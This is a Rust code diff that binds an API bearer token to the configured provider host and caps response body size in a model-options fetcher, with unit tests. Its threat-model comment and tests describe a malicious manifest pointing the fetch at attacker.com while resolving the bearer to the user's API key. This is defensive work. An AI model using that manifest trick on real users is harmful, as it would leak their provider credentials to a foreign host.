@@ -17,6 +17,21 @@ use std::collections::HashMap;
 use anyhow::Context;
 use astrid_capsule::manifest::OptionsFrom;
 
+/// Env key holding the user-configured provider location, by convention.
+///
+/// The `http` template references this field (e.g. `"{base_url}/v1/models"`),
+/// so its value is the trust anchor for the credential-host binding in
+/// [`should_send_bearer`]: the bearer is only attached when the resolved
+/// fetch host matches the host of this value.
+const PROVIDER_BASE_URL_KEY: &str = "base_url";
+
+/// Maximum models-response body size, in bytes.
+///
+/// Caps an otherwise-unbounded `GET` over an operator-supplied (and thus
+/// untrusted) endpoint. Matches the manifest-fetch streaming limit. An
+/// over-limit body errors, which the caller maps to the free-text fallback.
+const MAX_RESPONSE_BYTES: usize = 512 * 1024;
+
 /// Substitute `{key}` placeholders in `template` with values from `values`.
 ///
 /// Unknown placeholders are left intact (the caller treats a still-templated
@@ -29,6 +44,49 @@ pub(crate) fn resolve_template(template: &str, values: &HashMap<String, String>)
         result = result.replace(&pattern, value);
     }
     result
+}
+
+/// Decide whether the `Authorization: Bearer` header may be attached to a
+/// discovery `GET` of `http_url`, given the user-configured provider
+/// `base_url`.
+///
+/// # Threat model
+///
+/// `options-from.http` and `options-from.bearer` are independent capsule-
+/// supplied templates with no inherent host binding. Without this check a
+/// malicious manifest could declare `http = "https://attacker.com"` and
+/// `bearer = "{api_key}"`, exfiltrating the user's provider credential to
+/// an arbitrary host the moment the installer resolves the field.
+///
+/// The bearer is therefore bound to the provider: it is attached **only**
+/// when the resolved fetch host equals the host of the user-configured
+/// `base_url` value the `http` template is built from. Host comparison is
+/// case-insensitive (DNS is case-insensitive); port and scheme must match
+/// exactly, so a downgrade or alternate-port redirect to the same hostname
+/// does not leak the token. Any parse failure (either URL invalid, or
+/// either lacking a host) fails closed — the bearer is withheld.
+///
+/// The legitimate openai / openai-compat case builds `http` from
+/// `{base_url}`, so the hosts (and ports) are identical and the bearer is
+/// sent as before.
+pub(crate) fn should_send_bearer(http_url: &str, base_url: &str) -> bool {
+    let Ok(http) = reqwest::Url::parse(http_url) else {
+        return false;
+    };
+    let Ok(base) = reqwest::Url::parse(base_url) else {
+        return false;
+    };
+
+    let (Some(http_host), Some(base_host)) = (http.host_str(), base.host_str()) else {
+        return false;
+    };
+
+    // DNS hostnames are case-insensitive; ports must match exactly so that a
+    // same-host redirect to a different port cannot smuggle the credential
+    // to an unexpected listener. `port_or_known_default` folds the implicit
+    // scheme default (443/80) into the comparison.
+    http_host.eq_ignore_ascii_case(base_host)
+        && http.port_or_known_default() == base.port_or_known_default()
 }
 
 /// Parse a provider models response into a deduped list of option ids.
@@ -77,11 +135,15 @@ pub(crate) fn parse_options_response(body: &str, select_hint: &str) -> Vec<Strin
 ///
 /// Substitutes `values` into the `http`/`bearer` templates, performs a
 /// `GET`, and parses the response. The `Authorization: Bearer` header is
-/// sent only when `bearer` resolves to a non-empty value after trimming.
+/// sent only when `bearer` resolves to a non-empty value after trimming
+/// **and** the resolved fetch host matches the host of the user-configured
+/// provider `base_url` (see [`should_send_bearer`]) — so a capsule cannot
+/// exfiltrate the credential to an arbitrary host. The response body is
+/// capped at [`MAX_RESPONSE_BYTES`].
 ///
 /// Returns `Ok(non_empty_options)` on success, or `Err` on any failure
-/// (unresolved template, network error, non-2xx, non-JSON, empty list).
-/// The caller maps `Err` to a free-text fallback.
+/// (unresolved template, network error, non-2xx, oversized body, non-JSON,
+/// empty list). The caller maps `Err` to a free-text fallback.
 pub(crate) async fn fetch_options(
     opts: &OptionsFrom,
     values: &HashMap<String, String>,
@@ -103,6 +165,26 @@ pub(crate) async fn fetch_options(
         .map(|b| b.trim().to_string())
         .filter(|b| !b.is_empty());
 
+    // Bind the credential to the configured provider host. A capsule's
+    // `http`/`bearer` are independent templates with no inherent host
+    // binding, so without this check a manifest could point `http` at an
+    // attacker host while still resolving `bearer` to the user's API key.
+    // The bearer is attached only when the resolved fetch host matches the
+    // host of the user-configured `base_url`; otherwise it is withheld (the
+    // request will most likely 401 and fall back to free-text — the correct
+    // safe outcome).
+    let bearer = bearer.filter(|_| match values.get(PROVIDER_BASE_URL_KEY) {
+        Some(base_url) if should_send_bearer(&url, base_url) => true,
+        _ => {
+            tracing::warn!(
+                endpoint = %url,
+                "withholding options-from bearer: fetch host does not match the \
+                 configured provider ({PROVIDER_BASE_URL_KEY}) host"
+            );
+            false
+        },
+    });
+
     let client = reqwest::Client::builder()
         .user_agent("astrid-cli")
         .timeout(std::time::Duration::from_secs(15))
@@ -120,13 +202,41 @@ pub(crate) async fn fetch_options(
         response.status()
     );
 
-    let body = response.text().await?;
+    // Cap the body: the endpoint is operator-supplied and otherwise
+    // unbounded. Reject up-front on an advertised over-limit length so a
+    // hostile `Content-Length` can't force a large buffer, then bound the
+    // actual bytes read (the header is advisory and may be absent/lying for
+    // a chunked response). An over-limit response errors → free-text
+    // fallback.
+    anyhow::ensure!(
+        response
+            .content_length()
+            .is_none_or(|len| len <= MAX_RESPONSE_BYTES as u64),
+        "models response too large (advertised {} bytes; limit {MAX_RESPONSE_BYTES})",
+        response.content_length().unwrap_or_default()
+    );
+    let body = response.bytes().await?;
+    let body = decode_capped_body(&body)?;
     let options = parse_options_response(&body, opts.select_or_default());
     anyhow::ensure!(
         !options.is_empty(),
         "models endpoint returned no usable options"
     );
     Ok(options)
+}
+
+/// Bound a fetched response body and decode it as UTF-8.
+///
+/// Rejects a body larger than [`MAX_RESPONSE_BYTES`] (the operator-supplied
+/// endpoint is otherwise unbounded) and any non-UTF-8 payload. Errors map
+/// to the free-text fallback at the call site.
+fn decode_capped_body(body: &[u8]) -> anyhow::Result<String> {
+    anyhow::ensure!(
+        body.len() <= MAX_RESPONSE_BYTES,
+        "models response too large ({} bytes; limit {MAX_RESPONSE_BYTES})",
+        body.len()
+    );
+    String::from_utf8(body.to_vec()).context("models response was not valid UTF-8")
 }
 
 /// Synchronous bridge to [`fetch_options`] for the blocking install-prompt
@@ -250,6 +360,88 @@ mod tests {
             err.to_string().contains("unresolved placeholder"),
             "got: {err}"
         );
+    }
+
+    #[test]
+    fn bearer_sent_when_fetch_host_matches_configured_provider() {
+        // The legitimate openai / openai-compat case: `http` is built from
+        // `{base_url}`, so the hosts (and default port) match → bearer sent.
+        assert!(should_send_bearer(
+            "https://api.openai.com/v1/models",
+            "https://api.openai.com"
+        ));
+        // Case-insensitive host compare (DNS is case-insensitive).
+        assert!(should_send_bearer(
+            "https://API.OpenAI.com/v1/models",
+            "https://api.openai.com"
+        ));
+        // Explicit matching port also passes.
+        assert!(should_send_bearer(
+            "https://provider.example:8443/v1/models",
+            "https://provider.example:8443"
+        ));
+    }
+
+    #[test]
+    fn bearer_withheld_when_fetch_host_differs_from_provider() {
+        // Credential-exfiltration guard: a capsule whose `http` points at a
+        // foreign host must NOT receive the bearer, even though `bearer`
+        // would resolve to the user's key. This is the regression for the
+        // `http = "https://attacker.com"` + `bearer = "{api_key}"` attack.
+        assert!(!should_send_bearer(
+            "https://attacker.com/v1/models",
+            "https://api.openai.com"
+        ));
+        // Subdomain is a different host — no match.
+        assert!(!should_send_bearer(
+            "https://api.openai.com.attacker.com/v1/models",
+            "https://api.openai.com"
+        ));
+        // Same host, different explicit port → withheld (can't smuggle the
+        // token to an unexpected listener on the configured hostname).
+        assert!(!should_send_bearer(
+            "https://api.openai.com:8443/v1/models",
+            "https://api.openai.com"
+        ));
+        // Scheme downgrade to the same host → different default port → no.
+        assert!(!should_send_bearer(
+            "http://api.openai.com/v1/models",
+            "https://api.openai.com"
+        ));
+    }
+
+    #[test]
+    fn bearer_withheld_when_either_url_is_unparseable() {
+        // Fail closed: an invalid base_url or http URL must never send the
+        // credential.
+        assert!(!should_send_bearer(
+            "https://api.openai.com/v1/models",
+            "not a url"
+        ));
+        assert!(!should_send_bearer("not a url", "https://api.openai.com"));
+        // A scheme without a host (mailto:, data:) has no host to bind to.
+        assert!(!should_send_bearer(
+            "https://api.openai.com/v1/models",
+            "mailto:ops@example.com"
+        ));
+    }
+
+    #[test]
+    fn capped_body_decodes_within_limit() {
+        let body = br#"{ "data": [ { "id": "gpt-4o" } ] }"#;
+        let decoded = decode_capped_body(body).expect("within-limit body must decode");
+        assert!(decoded.contains("gpt-4o"));
+    }
+
+    #[test]
+    fn capped_body_rejects_over_limit() {
+        // DoS guard: an over-cap body must error → free-text fallback.
+        let oversized = vec![b'x'; MAX_RESPONSE_BYTES + 1];
+        let err = decode_capped_body(&oversized).expect_err("over-cap body must error");
+        assert!(err.to_string().contains("too large"), "got: {err}");
+        // Exactly at the limit is allowed.
+        let at_limit = vec![b'x'; MAX_RESPONSE_BYTES];
+        assert!(decode_capped_body(&at_limit).is_ok());
     }
 
     #[tokio::test]
